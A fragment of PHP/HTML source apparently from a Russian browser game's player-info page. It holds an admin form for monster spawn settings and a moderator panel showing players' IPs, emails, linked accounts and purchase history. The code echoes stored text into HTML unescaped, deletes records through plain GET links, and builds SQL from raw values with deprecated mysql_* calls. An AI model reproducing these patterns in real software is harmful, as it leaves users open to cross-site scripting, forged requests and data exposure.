									`lose_exp` = "'.mysql_real_escape_string($monster['lose_exp']).'",
									`win_itm` = "'.mysql_real_escape_string($monster['win_itm']).'",
									`lose_itm` = "'.mysql_real_escape_string($monster['lose_itm']).'",
									`win_eff` = "'.mysql_real_escape_string($monster['win_eff']).'",
									`lose_eff` = "'.mysql_real_escape_string($monster['lose_eff']).'",
									`win_ico` = "'.mysql_real_escape_string($monster['win_ico']).'",
									`lose_ico` = "'.mysql_real_escape_string($monster['lose_ico']).'",
									`win_back` = "'.mysql_real_escape_string($monster['win_back']).'",
									`time_restart` = "'.mysql_real_escape_string($monster['time_restart']).'",
									`nich_text` = "'.mysql_real_escape_string($monster['nich_text']).'"
								WHERE `id` = "'.mysql_real_escape_string($monster['id']).'" LIMIT 1');
							}
							
							echo '<font color=red><b>Новые данные были успешно сохранены!</b></font>';	
						}
						
				?>
                <b style="color:red">Параметры монстра:</b><br>
              <form method="post" action="inf.php?<?=$inf['id']?>&emonster">
              <table style="padding-left:10px;" width="100%" border="0" cellspacing="0" cellpadding="0">
                <tr>
                    <td>Место появления (id комнаты): 
                    <input type="text" name="bot_sroom" id="bot_sroom" value="<?=$monster['start_room']?>">
                    &nbsp; <input value="Обнулить ожидание" type="button" onclick="location.href='inf.php?<?=$inf['id']?>&emonster&restartmonster'" />
                    </td>
                </tr>
                <tr>
                    <td>Время ожидания после поражения бота: <input name="bot_trs" id="bot_trs" value="<?=$monster['time_restart']?>" type="text"> мин.</td>
                </tr>
                <tr>
                    <td>Исчезнет после своей победы:                    
                      <select name="bot_winback" id="bot_winback">
                        <option value="0">Нет</option>
                        <option <? if( $monster['win_back'] == 1 ) { echo 'selected'; } ?> value="1">Да</option>
                    </select></td>
                </tr>
                <tr>
                  <td><div align="left" style="height:1px; width:300px; background-color:#999999; margin:3px;"></div></td>
                </tr>
                <tr>
                    <td>Появляется, 
                      ДН 
                      <select name="bot_sday" id="bot_sday">
                        <option value="-1">&bull; День недели</option>
                        <option <? if( $monster['start_day'] == 1 ) { echo 'selected'; } ?> value="1">Понедельник</option>
                        <option <? if( $monster['start_day'] == 2 ) { echo 'selected'; } ?> value="2">Вторник</option>
                        <option <? if( $monster['start_day'] == 3 ) { echo 'selected'; } ?> value="3">Среда</option>
                        <option <? if( $monster['start_day'] == 4 ) { echo 'selected'; } ?> value="4">Четверг</option>
                        <option <? if( $monster['start_day'] == 5 ) { echo 'selected'; } ?> value="5">Пятница</option>
                        <option <? if( $monster['start_day'] == 6 ) { echo 'selected'; } ?> value="6">Суббота</option>
                        <option <? if( $monster['start_day'] == 7 ) { echo 'selected'; } ?> value="7">Воскресенье</option>
                    </select>
                     Д
					
					 <select name="bot_sdd" id="bot_sdd">
					   <option value="-1">&bull; День</option>
					   <? $i = 0; while($i < 31) { $i++; ?>
					   <option <? if( $monster['start_dd'] == $i ) { echo 'selected'; } ?> value="<?=$i?>">
					     <?=$i?>
				       </option>
					   <? } ?>
				      </select>
                      М 
					  <select name="bot_smm" id="bot_smm">
                      <option value="-1">&bull; Месяц</option>
                        <? $i = 0; while($i < 12) { $i++; ?>
                        <option <? if( $monster['start_mm'] == $i ) { echo 'selected'; } ?> value="<?=$i?>"><?=$i?></option>
                        <? } ?>
                    </select>
                      Ч 
					 <select name="bot_shh" id="bot_shh">
                      <option value="-1">&bull; Час</option>
                        <? $i = -1; while($i < 23) { $i++; ?>
                        <option <? if( $monster['start_hh'] == $i ) { echo 'selected'; } ?> value="<?=$i?>"><?=$i?></option>
                        <? } ?>
                    </select>
                      Мин 
					 <select name="bot_smin" id="bot_smin">
                      <option value="-1">&bull; Мин</option>
                        <? $i = -1; while($i < 58) { $i++; ?>
                        <option <? if( $monster['start_min'] == $i ) { echo 'selected'; } ?> value="<?=$i?>"><?=$i?></option>
                        <? } ?>
                    </select>
                  </td>
                </tr>
                <tr>
                  <td>Исчезает, &nbsp; &nbsp;ДН 
                      <select name="bot_bday" id="bot_bday">
                        <option value="-1">&bull; День недели</option>
                        <option <? if( $monster['back_day'] == 1 ) { echo 'selected'; } ?> value="1">Понедельник</option>
                        <option <? if( $monster['back_day'] == 2 ) { echo 'selected'; } ?> value="2">Вторник</option>
                        <option <? if( $monster['back_day'] == 3 ) { echo 'selected'; } ?> value="3">Среда</option>
                        <option <? if( $monster['back_day'] == 4 ) { echo 'selected'; } ?> value="4">Четверг</option>
                        <option <? if( $monster['back_day'] == 5 ) { echo 'selected'; } ?> value="5">Пятница</option>
                        <option <? if( $monster['back_day'] == 6 ) { echo 'selected'; } ?> value="6">Суббота</option>
                        <option <? if( $monster['back_day'] == 7 ) { echo 'selected'; } ?> value="7">Воскресенье</option>
                    </select>
                     Д
					
					 <select name="bot_bdd" id="bot_bdd">
					   <option value="-1">&bull; День</option>
					   <? $i = 0; while($i < 31) { $i++; ?>
					   <option <? if( $monster['back_dd'] == $i ) { echo 'selected'; } ?> value="<?=$i?>">
					     <?=$i?>
				       </option>
					   <? } ?>
			        </select>
                      М 
					  <select name="bot_bmm" id="bot_bmm">
                      <option value="-1">&bull; Месяц</option>
                        <? $i = 0; while($i < 12) { $i++; ?>
                        <option <? if( $monster['back_mm'] == $i ) { echo 'selected'; } ?> value="<?=$i?>"><?=$i?></option>
                        <? } ?>
                    </select>
                      Ч 
					 <select name="bot_bhh" id="bot_bhh">
                      <option value="-1">&bull; Час</option>
                        <? $i = -1; while($i < 23) { $i++; ?>
                        <option <? if( $monster['back_hh'] == $i ) { echo 'selected'; } ?> value="<?=$i?>"><?=$i?></option>
                        <? } ?>
                    </select>
                      Мин 
					 <select name="bot_bmin" id="bot_bmin">
                      <option value="-1">&bull; Мин</option>
                        <? $i = -1; while($i < 58) { $i++; ?>
                        <option <? if( $monster['back_min'] == $i ) { echo 'selected'; } ?> value="<?=$i?>"><?=$i?></option>
                        <? } ?>
                    </select></td>
                </tr>
                <tr>
                  <td><div align="left" style="height:1px; width:300px; background-color:#999999; margin:3px;"></div></td>
                </tr>
                <tr>
                  <td>Текст появления (Логин бота <b>{b}</b>, Логины игроков <b>{u}</b>):</td>
                </tr>
                <tr>
                  <td><input value="<?=$monster['start_text']?>" name="bot_stext" type="text" id="bot_stext" size="100" maxlength="250"></td>
                </tr>
                <tr>
                  <td>Текст исчезновения:</td>
                </tr>
                <tr>
                  <td><input value="<?=$monster['back_text']?>" name="bot_btext" type="text" id="bot_btext" size="100" maxlength="250"></td>
                </tr>
                <tr>
                  <td>Текст победы игрока:</td>
                </tr>
                <tr>
                  <td><input value="<?=$monster['win_text']?>" name="bot_wintext" type="text" id="bot_wintext" size="100" maxlength="250"></td>
                </tr>
                <tr>
                  <td>Текст поражения игрока:</td>
                </tr>
                <tr>
                  <td><input value="<?=$monster['lose_text']?>" name="bot_losetext" type="text" id="bot_losetext" size="100" maxlength="250"></td>
                </tr>
                <tr>
                  <td>Текст ничьей:</td>
                </tr>
                <tr>
                  <td><input value="<?=$monster['nich_text']?>" name="bot_nichtext" type="text" id="bot_nichtext" size="100" maxlength="250"></td>
                </tr>
                <tr>
                  <td><div align="left" style="height:1px; width:300px; background-color:#999999; margin:3px;"></div>                    <b>Награда (победа игрока):</b></td>
                </tr>
                <tr>
                  <td>Кр.: </td>
                </tr>
                <tr>
                  <td><input value="<?=$monster['win_money1']?>" name="bot_winmoney1" type="text" id="bot_winmoney1" size="100" maxlength="17"></td>
                </tr>
                <tr>
                  <td>Екр.: </td>
                </tr>
                <tr>
                  <td><input value="<?=$monster['win_money2']?>" name="bot_winmoney2" type="text" id="bot_winmoney2" size="100" maxlength="10"></td>
                </tr>
                <tr>
                  <td>Опыт (За 100% НР монстра): </td>
                </tr>
                <tr>
                  <td><input value="<?=$monster['win_exp']?>" name="bot_winexp" type="text" id="bot_winexp" size="100" maxlength="17"></td>
                </tr>
                <tr>
                  <td>Предметы (id@kolvo@data, ...):</td>
                </tr>
                <tr>
                  <td><input value="<?=$monster['win_itm']?>" name="bot_winitm" type="text" id="bot_winitm" size="100" maxlength="500"></td>
                </tr>
                <tr>
                  <td>Эффект:</td>
                </tr>
                <tr>
                  <td><input value="<?=$monster['win_eff']?>" name="bot_wineff" type="text" id="bot_wineff" size="100" maxlength="500"></td>
                </tr>
                <tr>
                  <td>Подвиги:</td>
                </tr>
                <tr>
                  <td><input value="<?=$monster['win_ico']?>" name="bot_winico" type="text" id="bot_winico" size="100" maxlength="500"></td>
                </tr>
                <tr>
                  <td><div align="left" style="height:1px; width:300px; background-color:#999999; margin:3px;"></div><b>Награда (поражение игрока):</b></td>
                </tr>
                <tr>
                  <td>Кр.: </td>
                </tr>
                <tr>
                  <td><input value="<?=$monster['lose_money1']?>" name="bot_losemoney1" type="text" id="bot_losemoney1" size="100" maxlength="10"></td>
                </tr>
                <tr>
                  <td>Екр.: </td>
                </tr>
                <tr>
                  <td><input value="<?=$monster['lose_money2']?>" name="bot_losemoney2" type="text" id="bot_losemoney2" size="100" maxlength="10"></td>
                </tr>
                <tr>
                  <td>Опыт: </td>
                </tr>
                <tr>
                  <td><input value="<?=$monster['lose_exp']?>" name="bot_loseexp" type="text" id="bot_loseexp" size="100" maxlength="17"></td>
                </tr>
                <tr>
                  <td>Предметы:</td>
                </tr>
                <tr>
                  <td><input value="<?=$monster['lose_itm']?>" name="bot_loseitm" type="text" id="bot_loseitm" size="100" maxlength="500"></td>
                </tr>
                <tr>
                  <td>Эффект:</td>
                </tr>
                <tr>
                  <td><input value="<?=$monster['lose_eff']?>" name="bot_loseeff" type="text" id="bot_loseeff" size="100" maxlength="500"></td>
                </tr>
                <tr>
                  <td>Подвиги:</td>
                </tr>
                <tr>
                  <td><input value="<?=$monster['lose_ico']?>" name="bot_loseico" type="text" id="bot_loseico" size="100" maxlength="500"></td>
                </tr>
            </table>
            <div style="padding-left:120px;">
            	<input type="submit" value="Сохранить" />
            </div>
            <br><br>
            </form>
<div style="height:1px; width:300px; background-color:#999999; margin:3px;" align="center">
<div onClick="location.href='inf.php?<?=$inf['id']?>'" style="border:1px solid #999999; cursor:pointer; background-color:#EAEAEA; width:150px;" align="center"><small>Скрыть</small></div>
</div>
<?
					}else{
?>
<div style="height:1px; width:300px; background-color:#999999; margin:3px;" align="center">
<div onClick="location.href='inf.php?<?=$inf['id']?>&emonster'" style="border:1px solid #999999; cursor:pointer; background-color:#EAEAEA; width:150px;" align="center"><small>Настройка монстра</small></div>
</div>
<?
					}
				}
				//темные делишки :D
				//темные делишки :D
				if($inf['no_ip'] != 'trupojor' && $u->info['align'] != 3.06 && $u->info['align'] != 1.6 && (($u->info['align']>1.1 && $u->info['align']<=1.99 && $inf['admin']<1) || ($u->info['align']>=3.05 && $u->info['align']<=3.99 && $inf['admin']<1) || $u->info['admin']>0 || $u->info['nadmin']>0)) 
				{
					$mults = '';
					$bIP = array();
					if($inf['id']!=42526 && $inf['id']!=1254){
					$spl = mysql_query('SELECT * FROM `mults` WHERE `ip` != "81.16.141.210" AND  (`uid` = "'.$inf['id'].'" OR `uid2` = "'.$inf['id'].'") AND `uid`!="0" AND `uid2`!="0"');
					}
					while($pls = mysql_fetch_array($spl))
					{
						$usr = $pls['uid'];
						if($usr==$inf['id'])
						{
							$usr = $pls['uid2'];
						}
						if(!isset($bIP[$usr]) && $usr!=$inf['id'])
						{
							$si = mysql_fetch_array(mysql_query('SELECT `id` FROM `users` WHERE `id` = "'.mysql_real_escape_string($usr).'" AND `login` != "delete" LIMIT 1'));
							if(isset($si['id']))
							{
								if($si['admin']==0 || $u->info['admin']>0)
								{
									$mults .= $u->microLogin($si['id'],1).', ';
								}
							}
						}
					}
					
					if( $inf['align'] == 1.59 || $inf['align'] == 1.6 || $inf['align'] == 3.059 || $inf['align'] == 3.06 ) {
						if( $nopal == true ) {
							unset($nopal);
						}
					}
					
					if( $u->info['align'] == 1.59 || $u->info['align'] == 1.6 || $u->info['align'] == 3.059 || $u->info['align'] == 3.06 ) {
						
					}elseif( $nopal == true ) {
						echo '<h3>Вы не можете просматривать информацию старшего по званию...</h3>';
					} elseif ( true == false && $u->info['admin']==0 && (($u->info['admin']==0 && (floor($u->info['align'])==1 && $inf['align']>=3.01 && $inf['align']<=3.99) || (floor($u->info['align'])==3 && $inf['align']>1.1 && $inf['align']<=1.99)) || ($u->info['admin']==0 && $inf['admin']>0)))  
					{
						echo '<h3>Персонаж носит вражескую склонность...</h3>';
					}else{
						echo '<br /><br /><div style="color:#828282;">За игроком замечены следующие темные делишки:<br /><small><span class=dsc>';
						if(!isset($_GET['mod_inf'])) {
							echo '<a href="inf.php?'.$inf['id'].'&mod_inf">Показать личное дело</a>';
						}else{
							//Личное дело персонажа
							$log = mysql_query('SELECT * FROM `users_delo` WHERE `uid`="'.$inf['id'].'" AND `type`="0" ORDER by `id` DESC LIMIT 21');
							$i = 0;
							while ($log_w = mysql_fetch_array($log))
							{
								if(isset($_GET['delinfd']) && $_GET['delinfd'] == $log_w['id']) { 
									mysql_query('DELETE FROM `users_delo` WHERE `id` = "'.$log_w['id'].'" LIMIT 1');
								}else{
									if( $u->info['admin'] > 0 ) {
										$admdel = ' <a href="/inf.php?'.$inf['id'].'&mod_inf&delinfd='.$log_w['id'].'"><small>удалить</small></a>';
									}
									echo ''.date("d.m.Y H:i:s",$log_w['time']).'&nbsp;'.$log_w['text'].''.$admdel.' <br />';
									$i++;
								}
							}
							//Личное дело персонажа
							$log = mysql_query('SELECT * FROM `delo` WHERE `uid`="'.$inf['id'].'" AND `type`="0" ORDER by `id` DESC LIMIT 21');
							$i = 0;
							while ($log_w = mysql_fetch_array($log))
							{
								if(isset($_GET['delinfd']) && $_GET['delinfd'] == $log_w['id']) { 
									mysql_query('DELETE FROM `users_delo` WHERE `id` = "'.$log_w['id'].'" LIMIT 1');
								}else{
									if( $u->info['admin'] > 0 ) {
										$admdel = ' <a href="/inf.php?'.$inf['id'].'&mod_inf&delinfd='.$log_w['id'].'"><small>удалить</small></a>';
									}
									echo ''.date("d.m.Y H:i:s",$log_w['time']).'&nbsp;'.$log_w['text'].''.$admdel.' <br />';
									$i++;
								}
							}
							echo '<a href="inf.php?'.$inf['id'].'">Скрыть личное дело</a>';
						}
						echo '</small><br>';
						//Информация для паладинов\тарманов\ангелов
						if($u->info['align'] == 1.7 ) {
							
						}elseif(($u->info['align']>=1.4 && $u->info['align']<=1.99 && $u->info['align']!=1.6 && $u->info['align']!=1.5 && $u->info['align']!=1.75 && $inf['admin']<1) || ($u->info['align']>=3.05 && $u->info['align']<=3.99 && $u->info['align']!=3.06 && $inf['admin']<1) || $u->info['admin']>0) 
						{
							if ((int)$u->info['align']==1) 
							{ 
								$rang = 'Паладинов'; 
							} elseif ((int)$u->info['align']==3) 
							{
								$rang = 'Тарманов'; 
							} else 
							{ 
								$rang = 'Ангелов'; 
							}					
							
							/*
							$pr1 = mysql_fetch_array(mysql_query('SELECT * FROM `register_code` WHERE `reg_id` = "'.$inf['id'].'" LIMIT 1'));
							$pr = array('login'=>'');
							if(isset($pr1['id']))
							{
								$pr = mysql_fetch_array(mysql_query('SELECT `id`,`login`,`level` FROM `users` WHERE `id` = "'.$pr1['uid'].'" LIMIT 1'));
								if(isset($pr['id']))
								{
									$pr['login'] = 'Персонажа пригласили: <b>'.$pr['login'].'</b> ['.$pr['level'].'] <a href="inf.php?'.$pr['id'].'" target="_blank"><img src="http://img.likebk.com/i/inf_capitalcity.gif" title="Инф. о '.$pr['login'].'"></a><br>';
								}else{
									$pr['login'] = 'Персонажа пригласили: #<i>'.$pr1['uid'].'</i><br>';
								}
							}
							*/
							
							if((int)$inf['host_reg'] >= 1){
								$inf['ref'] = $u->microLogin((int)$inf['host_reg'],1);
							}else{
								$inf['ref'] = '--';
							}
							if(!isset($inf['ipReg'])){ $inf['ipReg'] = '--'; }	
							echo '
							<br />
							<b style="color:red"><u>Только для '.$rang.'</u></b><br />
							<i>День рождения: '.$inf['bithday'].'<br />';
							
							if($u->info['admin'] > 0 && $u->info['id'] != 1000001) {
								  if( $inf['activ'] == 0 ) {
									 echo '<font color=green><b>'; 
								  }
									echo 'E-mail: '.$inf['mail'].'';
								  if( $inf['activ'] == 0 ) {
									  echo ' &nbsp; & &nbsp; '.$inf['send'].'<br />';
									 echo '</b></font>'; 
								  }else{
									 echo '<br />'; 
								  }
							}else{
								  if( $inf['activ'] == 0 ) {
									 echo '<font color=green><b>Персонаж активирован</b></font>';  
								  }else{
									 echo '<font color=red><b>Персонаж не активирован</b></font>'; 
								  }
								  echo '<br>';
							}
							if($inf['referals'] != 0){
								$refss = mysql_fetch_array(mysql_query('SELECT `id` FROM `users` WHERE `id` = "'.$inf['referals'].'"'));
								$refs = $u->microLogin($refss['id'],1);
							}else{
								$refs = '--';
							}
							echo 'Персонажа пригласили: '.$refs.'<br />
							Последний раз заходил в клуб: '.date('d.m.Y H:i',$inf['online']).'<br />
							'.$pr['login'].'IP при регистрации: '.$inf['ipReg'].'<br />';
							if($inf['no_ip'] == '' || $u->info['admin']>0) {
								echo 'IP последние: <b>'.$inf['ip'].'</b> ';
								
								if( !isset($_GET['allip']) ) {
									echo '<small><a href="/inf.php?'.$inf['id'].'&allip">показать все</a></small>';
								}else{
									echo '<small><a href="/inf.php?'.$inf['id'].'">скрыть все</a></small>';
								}
								
								if( isset($_GET['allip']) ) {
									$auth = mysql_query('SELECT * FROM `logs_auth` WHERE `ip` != "81.16.141.210" AND `uid`="'.$inf['id'].'" ORDER BY `time` DESC');
								}else{
									$auth = mysql_query('SELECT * FROM `logs_auth` WHERE `ip` != "81.16.141.210" AND `uid`="'.$inf['id'].'" AND `type`="1" ORDER by `id` DESC LIMIT 10');
								}
								$country = '';
								while ($auth_w = mysql_fetch_array($auth)) {
									echo '<br />'.$auth_w['ip'].' <small><b>('.date('d.m.Y H:i',$auth_w['time']).')</b></small>';
								}
							}else{
								echo 'IP последние: <b>'.$inf['no_ip'].'</b>';
							}
							
							
function user_browser($agent) {
	preg_match("/(MSIE|Opera|Firefox|Chrome|Version|Opera Mini|Netscape|Konqueror|SeaMonkey|Camino|Minefield|Iceweasel|K-Meleon|Maxthon)(?:\/| )([0-9.]+)/", $agent, $browser_info); // регулярное выражение, которое позволяет отпределить 90% браузеров
        list(,$browser,$version) = $browser_info; // получаем данные из массива в переменную
        if (preg_match("/Opera ([0-9.]+)/i", $agent, $opera)) return 'Opera '.$opera[1]; // определение _очень_старых_ версий Оперы (до 8.50), при желании можно убрать
        if ($browser == 'MSIE') { // если браузер определён как IE
                preg_match("/(Maxthon|Avant Browser|MyIE2)/i", $agent, $ie); // проверяем, не разработка ли это на основе IE
                if ($ie) return $ie[1].' based on IE '.$version; // если да, то возвращаем сообщение об этом
                return 'IE '.$version; // иначе просто возвращаем IE и номер версии
        }
        if ($browser == 'Firefox') { // если браузер определён как Firefox
                preg_match("/(Flock|Navigator|Epiphany)\/([0-9.]+)/", $agent, $ff); // проверяем, не разработка ли это на основе Firefox
                if ($ff) return $ff[1].' '.$ff[2]; // если да, то выводим номер и версию
        }
        if ($browser == 'Opera' && $version == '9.80') return 'Opera '.substr($agent,-5); // если браузер определён как Opera 9.80, берём версию Оперы из конца строки
        if ($browser == 'Version') return 'Safari '.$version; // определяем Сафари
        if (!$browser && strpos($agent, 'Gecko')) return 'Browser based on Gecko'; // для неопознанных браузеров проверяем, если они на движке Gecko, и возращаем сообщение об этом
        return $browser.' '.$version; // для всех остальных возвращаем браузер и версию
}
							
							
							echo'
							<br />
							Браузер: <b style="color:#0E0F0E">'.user_browser($inf['dateEnter']).'</b><br />
							';
														
							if($inf['no_ip'] == '' || $u->info['admin']>0) {
								if($mults!='' && $inf['id'] != 2835675 && $inf['id'] != 1000000 OR $inf['admin']==0){
									$mults = trim($mults,', ');
									echo 'Другие ники этого бойца:  '.$mults.'<br />';
								}
							}
							
							$referalos = '';
							$rfs = 0;
							
							//$sp = mysql_query('SELECT `id`,`login`,`ip`,`ipreg`,`timereg`,`online` FROM `users` WHERE `host_reg` = "'.$inf['id'].'" AND `activ` = "0" ORDER BY `timereg` DESC');
							$sp = mysql_query('SELECT `id`,`login`,`ip`,`ipreg`,`timereg`,`online` FROM `users` WHERE `referals` = "'.$inf['id'].'" AND `activ` = "0" ORDER BY `timereg` DESC');
							while( $pl = mysql_fetch_array($sp) ) {
								$referalos .= '<br>Дата рег.: '.date('d.m.Y H:i',$pl['timereg']).' / Был тут: '.date('d.m.Y H:i',$pl['online']).' &nbsp; '.$u->microLogin($pl['id'],1).' <small>( '.$pl['ip'].' , '.$pl['ipreg'].' )</small>';
								$rfs++;
							}
							
							if( $referalos == '' ) {
								$referalos = '<i>Отсутствуют</i>';
							}
							echo '<hr><b>Рефералы бойца:</b>'.$referalos.'<hr>';
							if($u->info['admin']>0)
							{
								echo 'Доп. возможности: <small><a href="inf.php?'.$inf['id'].'&wipe&sd4='.$u->info['nextAct'].'">сбросить характеристики</a></small><br>';
								$on1 = mysql_fetch_array(mysql_query('SELECT `time_all`,`time_today` FROM `online` WHERE `uid` = "'.$inf['id'].'" LIMIT 1'));
								echo 'Время в онлайне (всего): '.timeOut($on1['time_all']).'<br>Время в онлайне (сегодня): '.timeOut($on1['time_today']).'<br>';
							}	
							if($inf['molch3']<time() && $inf['molch1'] > time())
							{
								echo '<small><a href="inf.php?'.$inf['id'].'&molchMax&sd4='.$u->info['nextAct'].'">Запретить персонажу отправлять сообщения с молчанкой</a></small><br>';
							}
							
							echo'	
							Опыт: '.$inf['exp'].' <br />
							Число неиспользованных UP-ов: '.$inf['ability'].' <br />
							<b>Кредитов:</b> '.$inf['money'].'<br>';//<b>'Зубов:</b> <small>'.$u->zuby($inf['money4']).'</small>';
							$bnk = ''; $bmn1 = 0; $bmn2 = 0;
							$sp = mysql_query('SELECT * FROM `bank` WHERE `uid` = "'.$inf['id'].'"');
							$sp = mysql_query('SELECT * FROM `bank` WHERE `uid` = "'.$inf['id'].'"');
							$pl = mysql_fetch_array($sp);
							$bnk .= '<b>Еврокредитов:</b> '.$pl['money2'].' екр.<br>';
							$bnk .= '<b>Голд Еврокредитов:</b> '.$inf['money5'].' Gold ekr.<br>';
							if($pl['moneyBuy'] > 0) {
							  $bnk .= '<b><i><u>Персонаж покупал еврокредиты</u></i></b>&nbsp;&nbsp;Сумма : '.$pl['moneyBuy'].'<br />';
							  if( $u->info['admin'] > 0 || $u->info['id'] == 216266 ) {
								 
							  $sp = mysql_query('SELECT * FROM `delo` WHERE `login` = "AlhimPayment" AND `uid` = "'.$inf['id'].'" ORDER BY `id` DESC');
							  $i = 1;
							  while( $pl = mysql_fetch_array($sp) ) {
								 $urt52092 = '<br>'.date('d.m.Y H:i',$pl['time']).'. '.$u->microLogin($inf,1).' '.$pl['text'].''; 		
								 $i++;
							  }
							  
							  $sp = mysql_query('SELECT * FROM `users_delo` WHERE `login` = "AlhimPayment" AND `uid` = "'.$inf['id'].'" ORDER BY `id` ASC');
							  while( $pl = mysql_fetch_array($sp) ) {
								 $urt52092 = '<br>'.date('d.m.Y H:i',$pl['time']).'. '.$u->microLogin($inf,1).' '.$pl['text'].''; 		
								 $urt5209 .= $urt52092;
								 $i++;
							  }
							  
							  $timeno = array();
							  
							  $sp = mysql_query('SELECT * FROM `delo` WHERE `login` = "AlhimPayment" AND `uid` = "'.$inf['id'].'" ORDER BY `id` ASC');
							  while( $pl = mysql_fetch_array($sp) ) {
								 if(!isset($timeno[$pl['time']])) {
									 $timeno[$pl['time']]++;
									 $urt52092 = '<br>'.date('d.m.Y H:i',$pl['time']).'. '.$u->microLogin($inf,1).' '.$pl['text'].''; 		
									 $urt5209 .= $urt52092;
									 $i++;
								 }
							  }
							  
							  mysql_select_db('like_delo',$dbgo);
							  $sp = mysql_query('SELECT * FROM `delo` WHERE `login` = "AlhimPayment" AND `uid` = "'.$inf['id'].'" ORDER BY `id` ASC');
							  mysql_select_db('like',$dbgo);
							  while( $pl = mysql_fetch_array($sp) ) {
								 if(!isset($timeno[$pl['time']])) {
									 $timeno[$pl['time']]++;
									 $urt52092 = '<br>'.date('d.m.Y H:i',$pl['time']).'. '.$u->microLogin($inf,1).' '.$pl['text'].''; 		
									 $urt5209 .= $urt52092;
									 $i++;
								 }
							  }
							  
							  $bank = mysql_fetch_array(mysql_query('SELECT * FROM `bank` WHERE `uid` = "'.$inf['id'].'" LIMIT 1'));
							  $sp = mysql_query('SELECT * FROM `ekr2` WHERE `bank` = "'.$bank['id'].'"');
							  while( $pl = mysql_fetch_array($sp) ) {
								 if(!isset($timeno[$pl['time']])) {
									 $timeno[$pl['time']]++;
									 $urt52092 = '<br>'.$i.'. (old) '.date('d.m.Y H:i',$pl['time']).' Приобрёл '.$pl['buy'].'';
									 if( $pl['type'] == 1 ) {
										 $urt52092 .= 'Gold Ekr.';
									 }else{
										 $urt52092 .= ' Екр.';
									 }
									 $urt5209 .= $urt52092;
									 $i++;
								 }
							  }
							  
							  $bnk .= $urt5209.'</div>';
								 
								  
							  }
							}
							echo $bnk;
							/*while($pl = mysql_fetch_array($sp)) {
								if($pl['useNow'] > 0) {
									$bnk .= '<div style="padding:5px;border-bottom:1px solid #AEAEAE;background-color:#efefef;">';
								}else{
									$bnk .= '<div style="padding:5px;border-bottom:1px solid #AEAEAE">';
								}
								$bnk .= '&nbsp; &bull; <span style="display:inline-block;width:75px;"><small>№</small> '.$pl['id'].'</span>';
								$bnk .= '<span style="display:inline-block;width:100px;"><small>'.$pl['money1'].' кр.</small></span>';
								$bnk .= '<span style="display:inline-block;width:100px;"><small>'.$pl['money2'].' екр.</small></span>';
								if($u->info['admin'] > 0) {
									$bnk .= '<span style="display:inline-block;"><small>Пароль: '.htmlspecialchars($pl['pass'],NULL,'cp1251').'</small></span>';
								}
								if($pl['moneyBuy'] > 0) {
								  $ds = '<b><i><u>Персонаж покупал еврокредиты</u></i></b>&nbsp;&nbsp;Сумма : '.$pl['moneyBuy'].'<br />';
								}
								$bmn1 += $pl['money1'];
								$bmn2 += $pl['money2'];
								$bnk .= '</div>';
							}
							if($bnk != '') {
								echo '<br><b>Банковские счета:</b>'.$bnk.' &nbsp; <small><b>Деньги (Всего в банке):</b> &nbsp; '.$bmn1.' кр. &nbsp; &nbsp; '.$bmn2.' екр.</small><br/>'.$ds;
							}*/
							if($u->info['admin']>0 && $inf['admin']>0) {
								echo '<br><small>admin: '.$inf['admin'].'</small>';
							}
							if($inf['active']!=''){
							echo '<br><font color=red>Внимание!Если персонаж не получает письма с активацией отправте ему письмо вручную.</red>';
							echo '<br><input type=text value="'.$inf['mail'].'">';
							echo "<br><textarea cols=60 rows=5>Здравствуйте! Мы очень рады новому персонажу в нашем Мире! \r\n Ваш персонаж: ".$inf['login']."  \r\n Ссылка для активации: http://capitalcity.likebk.com/buttons.php?active=".$inf['active'].".\r\n\r\nС уважением, Администрация likebk.com!</textarea><br>";
							}
							echo '</div>';
						}
					}
				}
			  ?>
        <td align=right valign=top >
        <img src="https://mc.yandex.ru/watch/50394802" style="position:absolute; left:-9999px;" alt="" />
        <? /*
        <div style="float:right">
        <div class="findlg">
        <form action="inf.php" method="get">
          <table style="border:1px solid #AFAFAF" width="200" border="0" cellspacing="0" cellpadding="2">
            <tr>
              <td valign="middle" bgcolor="#D4D4D4" style="color: #333333">&nbsp;Поиск  по нику:</td>
              <td align="center" valign="middle" bgcolor="#D4D4D4">&nbsp;</td>
            </tr>
            <tr>
              <td width="150" align="center" valign="middle" bgcolor="#D4D4D4"><input style="width:145px" type="text" name="login" value=""></td>
              <td align="center" valign="middle" bgcolor="#D4D4D4"><button type="submit">Искать</button></td>
            </tr>
          </table>
          </form>
        </div>
		*/ ?>
        <table cellspacing=0 cellpadding=0>
          <tr>
            <td style='text-align: center; padding-bottom: 18; '><!-- Зодиак -->
                  <img title="<? //echo $name_zodiak; ?>" style="margin-bottom: 25; padding:5px;" src='http://img.likebk.com/i/zodiac/<? echo $id_zodiak; ?>.gif' border=0><BR>
                    <? if($inf['align']>1 && $inf['align']<2) { ?>
                  <A href='http://paladins.<? echo $c['host']; ?>/' target='_blank'><img style="padding:5px;" src='http://img.likebk.com/i/flag_light.gif' border=0></A><BR>
                  <A href='http://paladins.<? echo $c['host']; ?>/' target='_blank'><small>paladins.<? echo $c['host']; ?></small></A>
                    <? }elseif($inf['align']>=3.01 && $inf['align']<=3.99) { ?>
                  <A target='_blank' href='http://tarmans.<? echo $c['host']; ?>/'><img style="padding:5px;" src='http://img.likebk.com/i/flag_dark.gif' border=0></A><BR>
                  <A href='http://tarmans.<? echo $c['host']; ?>/' target='_blank'><small>tarmans.<? echo $c['host']; ?></small></A>
                    <? }elseif($inf['align']>=2 && $inf['align']<3) { ?>
                  <A target='_blank' href='http://<? echo $c['host']; ?>/'><img style="padding:5px;" src='http://img.likebk.com/i/flag_haos.gif' border=0></A><BR>
                  <A href='http://<? echo $c['host']; ?>.com/' target='_blank'><small><? echo $c['host']; ?></small></A>
                    <? }else{ ?>
                  <A target='_blank' href='http://<? echo $c['host']; ?>/news'> <img style="padding:5px;" src='http://img.likebk.com/i/flag_gray.gif'></a><BR>
                  <A href='http://<? echo $c['host']; ?>/news' target='_blank'><small>Новостная лента</small></A><br>
                    <? } ?>
            </td>
          </tr>
        </table></div></td>
      </table>
      </td>
  </tr>
</table>
<div align="left" style="height:1px; width:100%; background-color:#999999; margin-top:10px; margin-bottom:10px;"></div>
<?
if($inf['info_delete']!=0)
{
	if ($inf['level'] < 8) {?>
		<H3 align="center" style="color:#8f0000">Персонаж обезличен до достижения 8 уровня</H3>		
	<?php }
	else{?>
		<H3 align="center" style="color:#8f0000">Персонаж обезличен <? if($inf['info_delete']>1){ echo 'до '.date('d.m.Y H:i',$inf['info_delete']).'.'; }else{ echo '.'; } ?></H3>
	<?php }	
?>

<?
